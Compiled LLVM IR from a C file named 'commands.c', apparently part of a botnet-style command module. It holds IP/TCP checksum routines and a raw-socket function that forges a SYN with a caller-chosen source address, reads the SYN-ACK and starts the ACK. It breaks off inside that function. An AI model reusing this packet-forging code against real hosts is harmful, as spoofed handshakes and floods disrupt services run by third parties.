; ModuleID = 'commands.c'
source_filename = "commands.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

%struct.command = type { i8, i8* (...)* }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon }
%union.anon = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.timeval = type { i64, i64 }
%union.__SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.anon.0 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.arguments = type { %struct.target*, %struct.option*, i8, i8, i16 }
%struct.target = type { i32, i16 }
%struct.option = type { i8, i16, i8* }

@.str = private unnamed_addr constant [34 x i8] c"Sending SYN with ACK: %d SEQ: %d\0A\00", align 1
@.str.1 = private unnamed_addr constant [39 x i8] c"Received SYN-ACK with ACK: %d SEQ: %d\0A\00", align 1
@LOCAL_ADDRESS = dso_local global i32 0, align 4
@command_list = dso_local global [6 x %struct.command] zeroinitializer, align 16

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local zeroext i16 @checksum_generic(i16* %0, i32 %1) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  store i64 0, i64* %5, align 8
  br label %6

6:                                                ; preds = %16, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp ugt i32 %7, 1
  br i1 %8, label %9, label %19

9:                                                ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = add i64 %14, %13
  store i64 %15, i64* %5, align 8
  br label %16

16:                                               ; preds = %9
  %17 = load i32, i32* %4, align 4
  %18 = sub i32 %17, 2
  store i32 %18, i32* %4, align 4
  br label %6, !llvm.loop !6

19:                                               ; preds = %6
  %20 = load i32, i32* %4, align 4
  %21 = icmp eq i32 %20, 1
  br i1 %21, label %22, label %29

22:                                               ; preds = %19
  %23 = load i16*, i16** %3, align 8
  %24 = load i16, i16* %23, align 2
  %25 = trunc i16 %24 to i8
  %26 = sext i8 %25 to i64
  %27 = load i64, i64* %5, align 8
  %28 = add i64 %27, %26
  store i64 %28, i64* %5, align 8
  br label %29

29:                                               ; preds = %22, %19
  %30 = load i64, i64* %5, align 8
  %31 = lshr i64 %30, 16
  %32 = load i64, i64* %5, align 8
  %33 = and i64 %32, 65535
  %34 = add i64 %31, %33
  store i64 %34, i64* %5, align 8
  %35 = load i64, i64* %5, align 8
  %36 = lshr i64 %35, 16
  %37 = load i64, i64* %5, align 8
  %38 = add i64 %37, %36
  store i64 %38, i64* %5, align 8
  %39 = load i64, i64* %5, align 8
  %40 = xor i64 %39, -1
  %41 = trunc i64 %40 to i16
  ret i16 %41
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local zeroext i16 @checksum_tcpudp(%struct.iphdr* %0, i8* %1, i16 zeroext %2, i32 %3) #0 {
  %5 = alloca %struct.iphdr*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i16, align 2
  %8 = alloca i32, align 4
  %9 = alloca i16*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %5, align 8
  store i8* %1, i8** %6, align 8
  store i16 %2, i16* %7, align 2
  store i32 %3, i32* %8, align 4
  %14 = load i8*, i8** %6, align 8
  %15 = bitcast i8* %14 to i16*
  store i16* %15, i16** %9, align 8
  %16 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %17 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %16, i32 0, i32 8
  %18 = load i32, i32* %17, align 4
  store i32 %18, i32* %10, align 4
  %19 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %20 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %19, i32 0, i32 9
  %21 = load i32, i32* %20, align 4
  store i32 %21, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %22 = load i32, i32* %8, align 4
  store i32 %22, i32* %13, align 4
  br label %23

23:                                               ; preds = %26, %4
  %24 = load i32, i32* %8, align 4
  %25 = icmp sgt i32 %24, 1
  br i1 %25, label %26, label %36

26:                                               ; preds = %23
  %27 = load i16*, i16** %9, align 8
  %28 = load i16, i16* %27, align 2
  %29 = zext i16 %28 to i32
  %30 = load i32, i32* %12, align 4
  %31 = add i32 %30, %29
  store i32 %31, i32* %12, align 4
  %32 = load i16*, i16** %9, align 8
  %33 = getelementptr inbounds i16, i16* %32, i32 1
  store i16* %33, i16** %9, align 8
  %34 = load i32, i32* %8, align 4
  %35 = sub nsw i32 %34, 2
  store i32 %35, i32* %8, align 4
  br label %23, !llvm.loop !8

36:                                               ; preds = %23
  %37 = load i32, i32* %8, align 4
  %38 = icmp eq i32 %37, 1
  br i1 %38, label %39, label %46

39:                                               ; preds = %36
  %40 = load i16*, i16** %9, align 8
  %41 = bitcast i16* %40 to i8*
  %42 = load i8, i8* %41, align 1
  %43 = zext i8 %42 to i32
  %44 = load i32, i32* %12, align 4
  %45 = add i32 %44, %43
  store i32 %45, i32* %12, align 4
  br label %46

46:                                               ; preds = %39, %36
  %47 = load i32, i32* %10, align 4
  %48 = lshr i32 %47, 16
  %49 = and i32 %48, 65535
  %50 = load i32, i32* %12, align 4
  %51 = add i32 %50, %49
  store i32 %51, i32* %12, align 4
  %52 = load i32, i32* %10, align 4
  %53 = and i32 %52, 65535
  %54 = load i32, i32* %12, align 4
  %55 = add i32 %54, %53
  store i32 %55, i32* %12, align 4
  %56 = load i32, i32* %11, align 4
  %57 = lshr i32 %56, 16
  %58 = and i32 %57, 65535
  %59 = load i32, i32* %12, align 4
  %60 = add i32 %59, %58
  store i32 %60, i32* %12, align 4
  %61 = load i32, i32* %11, align 4
  %62 = and i32 %61, 65535
  %63 = load i32, i32* %12, align 4
  %64 = add i32 %63, %62
  store i32 %64, i32* %12, align 4
  %65 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %66 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %65, i32 0, i32 6
  %67 = load i8, i8* %66, align 1
  %68 = zext i8 %67 to i16
  %69 = call zeroext i16 @htons(i16 zeroext %68) #7
  %70 = zext i16 %69 to i32
  %71 = load i32, i32* %12, align 4
  %72 = add i32 %71, %70
  store i32 %72, i32* %12, align 4
  %73 = load i16, i16* %7, align 2
  %74 = zext i16 %73 to i32
  %75 = load i32, i32* %12, align 4
  %76 = add i32 %75, %74
  store i32 %76, i32* %12, align 4
  br label %77

77:                                               ; preds = %81, %46
  %78 = load i32, i32* %12, align 4
  %79 = lshr i32 %78, 16
  %80 = icmp ne i32 %79, 0
  br i1 %80, label %81, label %87

81:                                               ; preds = %77
  %82 = load i32, i32* %12, align 4
  %83 = and i32 %82, 65535
  %84 = load i32, i32* %12, align 4
  %85 = lshr i32 %84, 16
  %86 = add i32 %83, %85
  store i32 %86, i32* %12, align 4
  br label %77, !llvm.loop !9

87:                                               ; preds = %77
  %88 = load i32, i32* %12, align 4
  %89 = xor i32 %88, -1
  %90 = trunc i32 %89 to i16
  ret i16 %90
}

; Function Attrs: nounwind readnone willreturn
declare zeroext i16 @htons(i16 zeroext) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @tcp_handshake(i16 zeroext %0, i32 %1, i32 %2, i32 %3, i32 %4) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i16, align 2
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [40 x i8], align 16
  %17 = alloca [40 x i8], align 16
  %18 = alloca [512 x i8], align 16
  %19 = alloca %struct.iphdr*, align 8
  %20 = alloca %struct.tcphdr*, align 8
  %21 = alloca %struct.sockaddr_in, align 4
  %22 = alloca i32, align 4
  %23 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %24 = alloca i32, align 4
  %25 = alloca %struct.timeval, align 8
  %26 = alloca %union.__SOCKADDR_ARG, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i16 %0, i16* %7, align 2
  store i32 %1, i32* %8, align 4
  store i32 %2, i32* %9, align 4
  store i32 %3, i32* %10, align 4
  store i32 %4, i32* %11, align 4
  store i32 64, i32* %12, align 4
  store i32 5, i32* %13, align 4
  store i32 4, i32* %14, align 4
  %30 = call i32 @rand_new()
  %31 = and i32 %30, 65535
  store i32 %31, i32* %15, align 4
  %32 = bitcast [40 x i8]* %16 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %32, i8 0, i64 40, i1 false)
  %33 = bitcast [40 x i8]* %17 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %33, i8 0, i64 40, i1 false)
  %34 = bitcast [512 x i8]* %18 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %34, i8 0, i64 512, i1 false)
  store i32 0, i32* %22, align 4
  %35 = getelementptr inbounds [40 x i8], [40 x i8]* %16, i64 0, i64 0
  %36 = bitcast i8* %35 to %struct.iphdr*
  store %struct.iphdr* %36, %struct.iphdr** %19, align 8
  %37 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %38 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %37, i64 1
  %39 = bitcast %struct.iphdr* %38 to %struct.tcphdr*
  store %struct.tcphdr* %39, %struct.tcphdr** %20, align 8
  %40 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %41 = bitcast %struct.iphdr* %40 to i8*
  %42 = load i8, i8* %41, align 4
  %43 = and i8 %42, -16
  %44 = or i8 %43, 5
  store i8 %44, i8* %41, align 4
  %45 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %46 = bitcast %struct.iphdr* %45 to i8*
  %47 = load i8, i8* %46, align 4
  %48 = and i8 %47, 15
  %49 = or i8 %48, 64
  store i8 %49, i8* %46, align 4
  %50 = call zeroext i16 @htons(i16 zeroext 40) #7
  %51 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %52 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %51, i32 0, i32 2
  store i16 %50, i16* %52, align 2
  %53 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %54 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %53, i32 0, i32 5
  store i8 64, i8* %54, align 4
  %55 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %56 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %55, i32 0, i32 6
  store i8 6, i8* %56, align 1
  %57 = load i16, i16* %7, align 2
  %58 = call zeroext i16 @htons(i16 zeroext %57) #7
  %59 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %60 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %59, i32 0, i32 0
  %61 = bitcast %union.anon* %60 to %struct.anon.0*
  %62 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %61, i32 0, i32 1
  store i16 %58, i16* %62, align 2
  %63 = load i32, i32* %11, align 4
  %64 = trunc i32 %63 to i16
  %65 = call zeroext i16 @htons(i16 zeroext %64) #7
  %66 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %67 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %66, i32 0, i32 0
  %68 = bitcast %union.anon* %67 to %struct.anon.0*
  %69 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %68, i32 0, i32 0
  store i16 %65, i16* %69, align 4
  %70 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %71 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %70, i32 0, i32 0
  %72 = bitcast %union.anon* %71 to %struct.anon.0*
  %73 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %72, i32 0, i32 4
  %74 = load i16, i16* %73, align 4
  %75 = and i16 %74, -241
  %76 = or i16 %75, 80
  store i16 %76, i16* %73, align 4
  %77 = call i32 @rand_new()
  %78 = and i32 %77, 65535
  %79 = trunc i32 %78 to i16
  %80 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %81 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %80, i32 0, i32 0
  %82 = bitcast %union.anon* %81 to %struct.anon.0*
  %83 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %82, i32 0, i32 5
  store i16 %79, i16* %83, align 2
  %84 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %85 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %84, i32 0, i32 0
  %86 = bitcast %union.anon* %85 to %struct.anon.0*
  %87 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %86, i32 0, i32 4
  %88 = load i16, i16* %87, align 4
  %89 = and i16 %88, -4097
  store i16 %89, i16* %87, align 4
  %90 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %91 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %90, i32 0, i32 0
  %92 = bitcast %union.anon* %91 to %struct.anon.0*
  %93 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %92, i32 0, i32 4
  %94 = load i16, i16* %93, align 4
  %95 = and i16 %94, -257
  store i16 %95, i16* %93, align 4
  %96 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %97 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %96, i32 0, i32 0
  %98 = bitcast %union.anon* %97 to %struct.anon.0*
  %99 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %98, i32 0, i32 4
  %100 = load i16, i16* %99, align 4
  %101 = and i16 %100, -8193
  store i16 %101, i16* %99, align 4
  %102 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %103 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %102, i32 0, i32 0
  %104 = bitcast %union.anon* %103 to %struct.anon.0*
  %105 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %104, i32 0, i32 4
  %106 = load i16, i16* %105, align 4
  %107 = and i16 %106, -2049
  store i16 %107, i16* %105, align 4
  %108 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %109 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %108, i32 0, i32 0
  %110 = bitcast %union.anon* %109 to %struct.anon.0*
  %111 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %110, i32 0, i32 4
  %112 = load i16, i16* %111, align 4
  %113 = and i16 %112, -1025
  store i16 %113, i16* %111, align 4
  %114 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %115 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %114, i32 0, i32 0
  %116 = bitcast %union.anon* %115 to %struct.anon.0*
  %117 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %116, i32 0, i32 4
  %118 = load i16, i16* %117, align 4
  %119 = and i16 %118, -513
  %120 = or i16 %119, 512
  store i16 %120, i16* %117, align 4
  %121 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %122 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %121, i32 0, i32 0
  %123 = bitcast %union.anon* %122 to %struct.anon.0*
  %124 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %123, i32 0, i32 3
  store i32 0, i32* %124, align 4
  %125 = call i32 @rand_new()
  %126 = and i32 %125, 65535
  %127 = trunc i32 %126 to i16
  %128 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %129 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %128, i32 0, i32 3
  store i16 %127, i16* %129, align 4
  %130 = load i32, i32* %10, align 4
  %131 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %132 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %131, i32 0, i32 8
  store i32 %130, i32* %132, align 4
  %133 = load i32, i32* %9, align 4
  %134 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %135 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %134, i32 0, i32 9
  store i32 %133, i32* %135, align 4
  %136 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %137 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %136, i32 0, i32 7
  store i16 0, i16* %137, align 2
  %138 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %139 = bitcast %struct.iphdr* %138 to i16*
  %140 = call zeroext i16 @checksum_generic(i16* %139, i32 20)
  %141 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %142 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %141, i32 0, i32 7
  store i16 %140, i16* %142, align 2
  %143 = call i32 @rand_new()
  %144 = and i32 %143, 65535
  %145 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %146 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %145, i32 0, i32 0
  %147 = bitcast %union.anon* %146 to %struct.anon.0*
  %148 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %147, i32 0, i32 2
  store i32 %144, i32* %148, align 4
  %149 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %150 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %149, i32 0, i32 0
  %151 = bitcast %union.anon* %150 to %struct.anon.0*
  %152 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %151, i32 0, i32 6
  store i16 0, i16* %152, align 4
  %153 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %154 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %155 = bitcast %struct.tcphdr* %154 to i8*
  %156 = call zeroext i16 @htons(i16 zeroext 20) #7
  %157 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %153, i8* %155, i16 zeroext %156, i32 20)
  %158 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %159 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %158, i32 0, i32 0
  %160 = bitcast %union.anon* %159 to %struct.anon.0*
  %161 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %160, i32 0, i32 6
  store i16 %157, i16* %161, align 4
  %162 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %21, i32 0, i32 0
  store i16 2, i16* %162, align 4
  %163 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %164 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %163, i32 0, i32 0
  %165 = bitcast %union.anon* %164 to %struct.anon.0*
  %166 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %165, i32 0, i32 1
  %167 = load i16, i16* %166, align 2
  %168 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %21, i32 0, i32 1
  store i16 %167, i16* %168, align 2
  %169 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %170 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %169, i32 0, i32 9
  %171 = load i32, i32* %170, align 4
  %172 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %21, i32 0, i32 2
  %173 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %172, i32 0, i32 0
  store i32 %171, i32* %173, align 4
  %174 = getelementptr inbounds [40 x i8], [40 x i8]* %17, i64 0, i64 0
  %175 = getelementptr inbounds [40 x i8], [40 x i8]* %16, i64 0, i64 0
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %174, i8* align 16 %175, i64 40, i1 false)
  %176 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %177 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %176, i32 0, i32 0
  %178 = bitcast %union.anon* %177 to %struct.anon.0*
  %179 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %178, i32 0, i32 3
  %180 = load i32, i32* %179, align 4
  %181 = call i32 @ntohl(i32 %180) #7
  %182 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %183 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %182, i32 0, i32 0
  %184 = bitcast %union.anon* %183 to %struct.anon.0*
  %185 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %184, i32 0, i32 2
  %186 = load i32, i32* %185, align 4
  %187 = call i32 @ntohl(i32 %186) #7
  %188 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str, i64 0, i64 0), i32 %181, i32 %187)
  %189 = load i32, i32* %8, align 4
  %190 = getelementptr inbounds [40 x i8], [40 x i8]* %16, i64 0, i64 0
  %191 = bitcast %union.__CONST_SOCKADDR_ARG* %23 to %struct.sockaddr**
  %192 = bitcast %struct.sockaddr_in* %21 to %struct.sockaddr*
  store %struct.sockaddr* %192, %struct.sockaddr** %191, align 8
  %193 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %23, i32 0, i32 0
  %194 = load %struct.sockaddr*, %struct.sockaddr** %193, align 8
  %195 = call i64 @sendto(i32 %189, i8* %190, i64 40, i32 16384, %struct.sockaddr* %194, i32 16)
  %196 = trunc i64 %195 to i32
  store i32 %196, i32* %22, align 4
  %197 = load i32, i32* %22, align 4
  %198 = icmp eq i32 %197, -1
  br i1 %198, label %199, label %200

199:                                              ; preds = %5
  store i32 0, i32* %6, align 4
  br label %400

200:                                              ; preds = %5
  %201 = getelementptr inbounds [512 x i8], [512 x i8]* %18, i64 0, i64 0
  %202 = bitcast i8* %201 to %struct.iphdr*
  store %struct.iphdr* %202, %struct.iphdr** %19, align 8
  %203 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %204 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %203, i64 1
  %205 = bitcast %struct.iphdr* %204 to %struct.tcphdr*
  store %struct.tcphdr* %205, %struct.tcphdr** %20, align 8
  store i32 0, i32* %24, align 4
  %206 = getelementptr inbounds %struct.timeval, %struct.timeval* %25, i32 0, i32 0
  store i64 5, i64* %206, align 8
  %207 = getelementptr inbounds %struct.timeval, %struct.timeval* %25, i32 0, i32 1
  store i64 0, i64* %207, align 8
  %208 = load i32, i32* %8, align 4
  %209 = bitcast %struct.timeval* %25 to i8*
  %210 = call i32 @setsockopt(i32 %208, i32 1, i32 20, i8* %209, i32 16) #8
  store i32 %210, i32* %22, align 4
  %211 = load i32, i32* %22, align 4
  %212 = icmp eq i32 %211, -1
  br i1 %212, label %213, label %214

213:                                              ; preds = %200
  store i32 0, i32* %6, align 4
  br label %400

214:                                              ; preds = %200
  br label %215

215:                                              ; preds = %392, %214
  %216 = load i32, i32* %24, align 4
  %217 = icmp slt i32 %216, 10000
  br i1 %217, label %218, label %395

218:                                              ; preds = %215
  %219 = load i32, i32* %8, align 4
  %220 = getelementptr inbounds [512 x i8], [512 x i8]* %18, i64 0, i64 0
  %221 = bitcast %union.__SOCKADDR_ARG* %26 to %struct.sockaddr**
  store %struct.sockaddr* null, %struct.sockaddr** %221, align 8
  %222 = getelementptr inbounds %union.__SOCKADDR_ARG, %union.__SOCKADDR_ARG* %26, i32 0, i32 0
  %223 = load %struct.sockaddr*, %struct.sockaddr** %222, align 8
  %224 = call i64 @recvfrom(i32 %219, i8* %220, i64 512, i32 16384, %struct.sockaddr* %223, i32* null)
  %225 = trunc i64 %224 to i32
  store i32 %225, i32* %22, align 4
  %226 = load i32, i32* %22, align 4
  %227 = icmp eq i32 %226, -1
  br i1 %227, label %228, label %229

228:                                              ; preds = %218
  br label %395

229:                                              ; preds = %218
  %230 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %231 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %230, i32 0, i32 8
  %232 = load i32, i32* %231, align 4
  %233 = load i32, i32* %9, align 4
  %234 = icmp eq i32 %232, %233
  br i1 %234, label %235, label %392

235:                                              ; preds = %229
  %236 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %237 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %236, i32 0, i32 0
  %238 = bitcast %union.anon* %237 to %struct.anon.0*
  %239 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %238, i32 0, i32 4
  %240 = load i16, i16* %239, align 4
  %241 = lshr i16 %240, 12
  %242 = and i16 %241, 1
  %243 = zext i16 %242 to i32
  %244 = icmp eq i32 %243, 1
  br i1 %244, label %245, label %392

245:                                              ; preds = %235
  %246 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %247 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %246, i32 0, i32 0
  %248 = bitcast %union.anon* %247 to %struct.anon.0*
  %249 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %248, i32 0, i32 4
  %250 = load i16, i16* %249, align 4
  %251 = lshr i16 %250, 9
  %252 = and i16 %251, 1
  %253 = zext i16 %252 to i32
  %254 = icmp eq i32 %253, 1
  br i1 %254, label %255, label %392

255:                                              ; preds = %245
  %256 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %257 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %256, i32 0, i32 0
  %258 = bitcast %union.anon* %257 to %struct.anon.0*
  %259 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %258, i32 0, i32 3
  %260 = load i32, i32* %259, align 4
  %261 = call i32 @ntohl(i32 %260) #7
  %262 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %263 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %262, i32 0, i32 0
  %264 = bitcast %union.anon* %263 to %struct.anon.0*
  %265 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %264, i32 0, i32 2
  %266 = load i32, i32* %265, align 4
  %267 = call i32 @ntohl(i32 %266) #7
  %268 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.1, i64 0, i64 0), i32 %261, i32 %267)
  %269 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %270 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %269, i32 0, i32 0
  %271 = bitcast %union.anon* %270 to %struct.anon.0*
  %272 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %271, i32 0, i32 2
  %273 = load i32, i32* %272, align 4
  %274 = call i32 @ntohl(i32 %273) #7
  %275 = add i32 %274, 1
  %276 = call i32 @htonl(i32 %275) #7
  store i32 %276, i32* %27, align 4
  %277 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %278 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %277, i32 0, i32 0
  %279 = bitcast %union.anon* %278 to %struct.anon.0*
  %280 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %279, i32 0, i32 3
  %281 = load i32, i32* %280, align 4
  store i32 %281, i32* %28, align 4
  %282 = getelementptr inbounds [40 x i8], [40 x i8]* %17, i64 0, i64 0
  %283 = bitcast i8* %282 to %struct.iphdr*
  store %struct.iphdr* %283, %struct.iphdr** %19, align 8
  %284 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %285 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %284, i64 1
  %286 = bitcast %struct.iphdr* %285 to %struct.tcphdr*
  store %struct.tcphdr* %286, %struct.tcphdr** %20, align 8
  %287 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %288 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %287, i32 0, i32 0
  %289 = bitcast %union.anon* %288 to %struct.anon.0*
  %290 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %289, i32 0, i32 4
  %291 = load i16, i16* %290, align 4
  %292 = and i16 %291, -4097
  %293 = or i16 %292, 4096
  store i16 %293, i16* %290, align 4
  %294 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %295 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %294, i32 0, i32 0
  %296 = bitcast %union.anon* %295 to %struct.anon.0*
  %297 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %296, i32 0, i32 4
  %298 = load i16, i16* %297, align 4
  %299 = and i16 %298, -257
  store i16 %299, i16* %297, align 4
  %300 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %301 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %300, i32 0, i32 0
  %302 = bitcast %union.anon* %301 to %struct.anon.0*
  %303 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %302, i32 0, i32 4
  %304 = load i16, i16* %303, align 4
  %305 = and i16 %304, -8193
  store i16 %305, i16* %303, align 4
  %306 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %307 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %306, i32 0, i32 0
  %308 = bitcast %union.anon* %307 to %struct.anon.0*
  %309 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %308, i32 0, i32 4
  %310 = load i16, i16* %309, align 4
  %311 = and i16 %310, -2049
  store i16 %311, i16* %309, align 4
  %312 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %313 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %312, i32 0, i32 0
  %314 = bitcast %union.anon* %313 to %struct.anon.0*
  %315 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %314, i32 0, i32 4
  %316 = load i16, i16* %315, align 4
  %317 = and i16 %316, -1025
  store i16 %317, i16* %315, align 4
